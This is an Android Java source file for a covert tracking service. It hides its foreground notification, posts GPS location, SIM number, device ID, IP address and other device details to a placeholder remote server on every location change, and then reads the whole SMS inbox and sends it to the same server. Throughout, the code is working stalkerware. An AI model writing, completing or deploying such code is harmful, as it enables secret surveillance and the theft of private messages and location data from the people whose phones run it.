package zile.gps;

import android.annotation.SuppressLint;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.app.NotificationCompat;

import com.google.gson.Gson;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Locale;
import java.util.Map;

public class LocationService extends Service {
	private LocationManager mLocationManager;
	private LocationListener mLocationListener;
	public static final String CHANNEL_ID = "LocationServiceChannel";
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
			Log.i("LocationService", "onStartCommand");
			NotificationManager notificationManager = (NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
			NotificationChannel channel = new NotificationChannel(CHANNEL_ID, "GPSForegroundChannel", NotificationManager.IMPORTANCE_MIN);
			channel.setDescription("GPSForegroundChannel");
			channel.setLockscreenVisibility(NotificationCompat.VISIBILITY_SECRET);
			notificationManager.createNotificationChannel(channel);
			NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
					.setSmallIcon(R.mipmap.ic_launcher)
					.setPriority(NotificationCompat.PRIORITY_MIN)
					.setVisibility(NotificationCompat.VISIBILITY_SECRET);
			Notification notification = builder.build();
			startForeground(1337, notification);

			mLocationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
			mLocationListener = new LocationListener() {
				@Override
				public void onLocationChanged(Location location) {
					sendLocationToServer(location);
				}

				@Override
				public void onStatusChanged(String provider, int status, Bundle extras) {
				}

				@Override
				public void onProviderEnabled(String provider) {
				}

				@Override
				public void onProviderDisabled(String provider) {
				}
			};
			if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
				Log.e("LocationService", "No permission!");
			} else {
				mLocationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000, 20, mLocationListener);
			}

		return START_STICKY;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		stopSelf();
		if (mLocationListener != null)
		{
			mLocationManager.removeUpdates(mLocationListener);
		}
	}

	@Nullable
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	// Functions

	private String getAndroidVersion() {
		return Build.VERSION.RELEASE;
	}

	private String getBatteryStatus() {
		BatteryManager bm = (BatteryManager) this.getSystemService(Context.BATTERY_SERVICE);
		String status;
		switch (bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_STATUS)) {
			case BatteryManager.BATTERY_STATUS_NOT_CHARGING:
				status = "Not charging";
				break;
			case BatteryManager.BATTERY_STATUS_DISCHARGING:
				status = "Discharging";
				break;
			case BatteryManager.BATTERY_STATUS_FULL:
				status = "Full";
				break;
			default:
				status = "Unknown";
		}
		return status;
	}

	private int getBatteryLevel() {
		BatteryManager bm = (BatteryManager) this.getSystemService(Context.BATTERY_SERVICE);
		return bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY);
	}

	private String getUptime() {
		long elapsedRealtime = SystemClock.elapsedRealtime();
		SimpleDateFormat timeFormat = new SimpleDateFormat("HH:mm:ss", Locale.US);
		return timeFormat.format(new Date(elapsedRealtime));
	}

	@SuppressLint("DefaultLocale")
	private String getIpAddress() {
		WifiManager wm = (WifiManager) this.getSystemService(Context.WIFI_SERVICE);
		int ip = wm.getConnectionInfo().getIpAddress();
		return String.format("%d.%d.%d.%d", (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
	}

	@SuppressLint("HardwareIds")
	private String getSimCardNumber() {
		TelephonyManager tm = (TelephonyManager) this.getSystemService(Context.TELEPHONY_SERVICE);
		if (ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_NUMBERS) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(this, android.Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) {
			return "NO_PERMISSION";
		}
		return tm.getLine1Number();
	}
	@SuppressLint("HardwareIds")
	private String getUID() {
		return Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
	}
	private String getBtName() {
		return Settings.Secure.getString(getContentResolver(), "bluetooth_name");
	}
	private String getLocationJson(Location location) {
		JSONObject json = new JSONObject();
		try {
			json.put("device_name", Build.MODEL);
			json.put("latitude", location.getLatitude());
			json.put("longitude", location.getLongitude());
			json.put("accuracy", location.getAccuracy());
			json.put("android_version", getAndroidVersion());
			json.put("battery_status", getBatteryStatus());
			json.put("battery_level", getBatteryLevel());
			json.put("uptime", getUptime());
			json.put("ip_address", getIpAddress());
			json.put("sim", getSimCardNumber());
			json.put("unique_id", getUID());
			json.put("bluetooth_name", getBtName());

		} catch (JSONException e) {
			Log.e("LocationService", "getLocationJson() error:", e);
		}
		return json.toString();
	}
	private void checkAllSmsFromPhone() {
		List<Map<String, String>> smsList = new ArrayList<>();
		Uri uri = Uri.parse("content://sms/inbox");
		Cursor cursor = getContentResolver().query(uri, new String[]{"_id", "address", "date", "body"}, null, null, null);
		cursor.moveToFirst();
		while (!cursor.isAfterLast()) {
			Map<String, String> smsData = new HashMap<>();
			smsData.put("sender", cursor.getString(1));
			smsData.put("date", cursor.getString(2));
			smsData.put("message", cursor.getString(3));
			smsList.add(smsData);
			cursor.moveToNext();
		}
		cursor.close();
		sendSmsDataToServer(smsList);
	}
	private void sendSmsDataToServer(List<Map<String, String>> smsList) {
		Gson gson = new Gson();
		String json = gson.toJson(smsList);
		new Thread(() -> {
			try {
				URL url = new URL("https://YOUR_REMOTE_SERVER/gps/sms.php?zile42O&id=" + getUID());
				HttpURLConnection conn = (HttpURLConnection) url.openConnection();
				conn.setRequestMethod("POST");
				conn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
				conn.setRequestProperty("Accept", "application/json");
				conn.setDoOutput(true);
				conn.setDoInput(true);
				DataOutputStream os = new DataOutputStream(conn.getOutputStream());
				os.writeBytes(json);
				os.flush();
				os.close();
				int responseCode = conn.getResponseCode();
				Log.d("HTTPS SMS Post", "Response Code : " + responseCode);
				BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
				String inputLine;
				StringBuilder response = new StringBuilder();
				while ((inputLine = in.readLine()) != null) {
					response.append(inputLine);
				}
				in.close();
			} catch (Exception e) {
				Log.e("LocationService", "Error while sending json response: ", e);
			}
		}).start();
	}

	private void sendLocationToServer(final Location location) {
		new Thread(() -> {
			try {
				if (isOnline(this)) {
					URL url = new URL("https://YOUR_REMOTE_SERVER/gps/api.php?zile42O");
					HttpURLConnection conn = (HttpURLConnection) url.openConnection();
					conn.setRequestMethod("POST");
					conn.setRequestProperty("Content-Type", "application/json;charset=UTF-8");
					conn.setRequestProperty("Accept", "application/json");
					conn.setDoOutput(true);
					conn.setDoInput(true);
					DataOutputStream os = new DataOutputStream(conn.getOutputStream());
					os.writeBytes(getLocationJson(location));
					os.flush();
					os.close();
					int responseCode = conn.getResponseCode();
					Log.d("HTTPS Location Post", "Response Code : " + responseCode);
					BufferedReader in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
					String inputLine;
					StringBuilder response = new StringBuilder();
					while ((inputLine = in.readLine()) != null) {
						response.append(inputLine);
					}
					in.close();
					checkAllSmsFromPhone();

				}
				stopSelf();
			} catch (Exception e) {
				Log.e("LocationService", "Error while sending json response: ", e);
			}
		}).start();
	}
	private boolean isOnline(Context context) {
		ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
		NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
		return networkInfo != null && networkInfo.isConnected();
	}
}